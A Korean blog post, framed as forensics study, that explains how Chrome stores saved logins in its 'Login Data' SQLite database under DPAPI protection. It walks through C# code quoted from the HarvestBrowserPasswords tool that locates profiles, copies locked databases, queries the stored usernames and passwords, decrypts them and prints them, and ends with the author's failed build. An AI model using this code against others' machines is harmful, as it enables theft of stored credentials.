---
layout: post
title:  "Password Crack - Chorme"
date:   2022-06-23 11:05:23
categories: [Forensic, 암호 알고리즘]
---

# Chrome Credential  
<br/>

### Chrome Credential 저장 위치 

<br/>
Google은 Chrome을 포함한 모든 Forensic Artifact 를 사용자 `%LocalAppData%` 디렉토리 아래의 각 프로필에 대한 각자의 위치에 저장합니다. 예를 들어, 2개의 Google Chrome 프로필이 있는 사용자 계정에는 각 프로필에 대한 로그인 데이터가 포함된 디렉터리 하나가 있으며, 각 디렉터리에는 저장된 자격 증명 집합이 포함되어 있습니다. 
<br/><br/>

* C:\Users\[UserName]\AppData\Local\Google\Chrome\User Data\Default(항상 첫 번째 프로필의 이름)
* C:\Users\[UserName]\AppData\Local\Google\Chrome\User Data\Profile 2(이후 프로파일의 이름은 반복적으로 지정됨)

Google Credential 자격증명 수집에 대해 특히 관련 있는 Artifact 는 `Login Data` 각 사용자의 프로필 디렉터리에 포함된 (SQLite 3 DataBase)입니다. 

![20220623_135635](https://user-images.githubusercontent.com/46625602/175215133-0ba2321a-c003-43b3-a581-87c38d497463.png)

<br/>

`Login Data` SQLite 데이터 베이스는 주로 자동 채우기를 위해 저장하려는 사용자 이름과 비밀번호를 저장하기 위해 존재하지만, 올바른 URL에 자격증명을 제출하는 방법에 대한 많으 메타데이터 정보도 저장합니다. 간단하게 하기 위해 DB의 `Logins` 테이블, 특히 `signon_realm` 테이블의 `username_value`와 `password_value` 테이블의 열에만 관심이 있습니다. 아래 이미지에서 저는 SQLiteStudio를 사용하여 `password_value` 암호화 된다는 것을 보여주는 데이터 베이스를 보고 있습니다. 이 값은 Microsoft의 DPAPI(데이터 보호 API)를 사용하여 암호화 됩니다. 

<br/>

DPAPI는 사용이 매우 간단하며 특정 사용자 도는 특정 사용자에 연결된 암시적 암호화 키를 사용하여 데이터 `blob`(임의의 바이트 배열)을 대칭적으로 암호화/복호화 하는 CryptProtectData() 및 CryptUnprotectData() 의 두가지 기능으로만 구성 됩니다. DPAPI 암호화 된 자격 증명의 장점은 해당 사용자의 컨텍스트에서 이미 코드를 실행하고 있는 경우 대상 사용자의 자격 증명을 해독하기 위해 대상 사용자의 암호나 키를 알 필요가 없다는 것 입니다. 단점은 대상 사용자의 컨텍스트에서 코드 실행이 없는 경우 자격증명을 해독하기 위해 몇 가지 추가 작업을 수행해야 합니다. 이 경우에는 전수 조사 방법을 사용하여 대상 사용자의 알려진 암호를 사용하여 Mimikatz "/unprotect" -ing DPAPI 암호화 된 자격 증명을 보여 줍니다. 

<br/>

## Chrome 암호화 된 로그인 찾기 및 추출 

몇 가지 간단한 단계를 따르면 암호 해독을 위해 저장된 자격 증명 수집을 시작할 수 있습니다. 아래 HarvestBrowserPasswords의 코드 조각을 사용하여 각 단계를 살펴 보겠습니다. 

* %LocalAppData%\Google\Chrome

## 1. 프로필에 대한 현재 사용자의 디렉터리 검색 


```cs
public static List<string> FindChromeProfiles()
{
    string localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
    string chromeDirectory = localAppData + @"\Google\Chrome\User Data";
    
    List<string> profileDirectories = new List<string>();

    if (Directory.Exists(chromeDirectory))
    {
        //Add default profile location once existence of chrome directory is confirmed
        profileDirectories.Add(chromeDirectory + "\\Default");
        foreach (string directory in Directory.GetDirectories(chromeDirectory))
        {
            if (directory.Contains("Profile "))
            {
                profileDirectories.Add(directory);

            }
        }
    }

    return profileDirectories;
}
```
크롬 비밀번호 가져오는 코드 

```cs
public static List<BrowserLoginData> GetChromePasswords(string userAccountName)
{
    List<string> chromeProfiles = FindChromeProfiles();

    List<BrowserLoginData> loginDataList = new List<BrowserLoginData>();

    foreach (string chromeProfile in chromeProfiles)
    {
        string loginDataFile = chromeProfile + @"\Login Data";
        if (File.Exists(loginDataFile))
        {
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine($"[+] Found Chrome credential database for user: \"{userAccountName}\" at: \"{loginDataFile}\"");
            Console.ResetColor();

            ChromeDatabaseDecryptor decryptor = new ChromeDatabaseDecryptor(loginDataFile);

            loginDataList = (loginDataList.Concat(decryptor.ChromeLoginDataList)).ToList();
        }
        else
        {
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine($"[-] No credential database found in chrome profile {chromeProfile}");
            Console.ResetColor();
        }
    }

    return loginDataList;
}
```

## 2. 존재하는 각 프로필에 대해 Login Data SQLite DB에 연결하고 필요한 세가지 정보를 쿼리 

다음과 같이 Database와 상호 작용하기 위해 System.Data.SQLite 패키지 사용

```cs
private SQLiteConnection ChromeDatabaseConnection(string databaseFilePath)
{
    FilePath = databaseFilePath;
    SQLiteConnection sqliteConnection = new SQLiteConnection(
        $"Data Source={FilePath};" +
        $"Version=3;" +
        $"New=True");

    ChromeLoginDataList = new List<BrowserLoginData>();

    sqliteConnection.Open();

    return sqliteConnection;
}

```

SQLiteConnection 객체가 있으면 db를 쿼리하고 관련 열에서 데이터를 추출할 수 있습니다.

```cs
private void ChromeDatabaseDecrypt(SQLiteConnection sqliteConnection)
{
SQLiteCommand sqliteCommand = sqliteConnection.CreateCommand();
sqliteCommand.CommandText = "SELECT action_url, username_value, password_value FROM logins";
SQLiteDataReader sqliteDataReader = sqliteCommand.ExecuteReader();

//Iterate over each returned row from the query
while (sqliteDataReader.Read())
{
    //Store columns as variables
    string formSubmitUrl = sqliteDataReader.GetString(0);

    //Avoid Printing empty rows
    if (string.IsNullOrEmpty(formSubmitUrl))
    {
        continue;
    }

    string username = sqliteDataReader.GetString(1);
    byte[] password = (byte[])sqliteDataReader[2]; //Cast to byteArray for DPAPI decryption
```

이 도구를 빌드하는 동안 Chrome이 프로필 열려 있고 해당 프로필이 로그인 될 때마다 프로필의 로그인 데이터 베이스에 대한 열린 연결을 유지하는 것으로 보입니다. 결과적으로 a 가 발생하며 이 경우 데이터 베이스 파일을 다음 System.Data.SQLite.SQLiteException 복사하기로 선택했습니다. `%TEMP%` 쿼리한 다음 임시 사본을 삭제합니다. 

```cs
public ChromeDatabaseDecryptor(string databaseFilePath)
{
    SQLiteConnection connection;
    
    //Attempt connection to the 'Login Data' database file and decrypt its contents
    try
    {
        connection = ChromeDatabaseConnection(databaseFilePath);
        ChromeDatabaseDecrypt(connection);
        connection.Dispose();
    }
    //If unable to connect, copy the database to a temp directory and access the copied version of the db file
    catch (SQLiteException)
    {
        string tempDatabaseFilePath = Path.GetTempPath() + "Login Data";

        Console.ForegroundColor = ConsoleColor.Red;
        Console.WriteLine($"[-] Unable to access database file. Copying it to temporary location at:\n\t{Path.GetTempPath()}");
        Console.ResetColor();

        File.Copy(databaseFilePath, tempDatabaseFilePath, true);

        connection = ChromeDatabaseConnection(tempDatabaseFilePath);
        ChromeDatabaseDecrypt(connection);

        //The program will maintain a handle to the temp database file despite database connection disposal. Garbage collection necessary to release the temp file for deletion
        GC.Collect();
        GC.WaitForPendingFinalizers();
        File.Delete(tempDatabaseFilePath);
    }
}
```

## 3. 비밀번호를 해독하세요!

이제 DB에서 일반 텍스트로 된 URL과 사용자 이름을 얻었으므로 DPAPI를 통해 암호를 보호 해제 하기만 하면 된다. Unprotect() 함수는 암호화된 바이트 배역, 선택적 엔트로피 값 및 데이터가 암호화 된 범위(CurrentUser 또는 LocalMachine)의 세가지 인수가 필요합니다. 


```cs
//DPAPI Decrypt - Requires System.Security.dll and System.Security.Cryptography
byte[] decryptedBytes = ProtectedData.Unprotect(password, null, DataProtectionScope.CurrentUser);
string decryptedPasswordString = Encoding.ASCII.GetString(decryptedBytes);
```

Browser LoginData 해독된 자격증명을 저장할 수 있는 개체를 만들고, 이 도구는 BrowserLoginData 암호 해독된 로그인 집합에 대해서 새 개체를 생성하고 콘솔이나 파일에 출력하기 위해 목록에 추가합니다. 

```cs
BrowserLoginData loginData = new BrowserLoginData(formSubmitUrl, username, decryptedPasswordString, "Chrome");
ChromeLoginDataList.Add(loginData);
```

원래 [HarvestBrowserPasswords](https://github.com/Apr4h/HarvestBrowserPasswords) 를 사용하면 복호화가 진행 되어야 하지만, 오래된 버전이라서 빌드를 하기 전에도, 에러가 났다.

* 정상 실행 내용
![image](https://user-images.githubusercontent.com/46625602/175468396-5f7e2f8c-b985-4929-bab8-672a896fc907.png)


[HarvestBrowserPasswords](https://github.com/Apr4h/HarvestBrowserPasswords) 의 버전을 실행 시키기 위해서 System.Security.Cryptography.Csp 라는 라이브러리를 추가로 설치해 주었고, 새로 빌드를 진행했다. 

![image](https://user-images.githubusercontent.com/46625602/175466156-a9d5c57c-8ba3-46a6-974c-bd9546e4b4e1.png)


* 실행 후 오류  
![image](https://user-images.githubusercontent.com/46625602/175466524-d78691cb-dc63-44ff-ab29-96ad45cb8d42.png)

필요한 라이브러리를 설치해주었음에도 불구하고, 버전의 차이로 인해 매개변수가 상이하여, 다음과 같이 에러가 났다.

<br/>

---

**[Reference]**

* [https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/](https://apr4h.github.io/2019-12-20-Harvesting-Browser-Credentials/)
* [https://github.com/Apr4h/HarvestBrowserPasswords](https://github.com/Apr4h/HarvestBrowserPasswords)
* [https://github.com/louisabraham/ffpass](https://github.com/louisabraham/ffpass)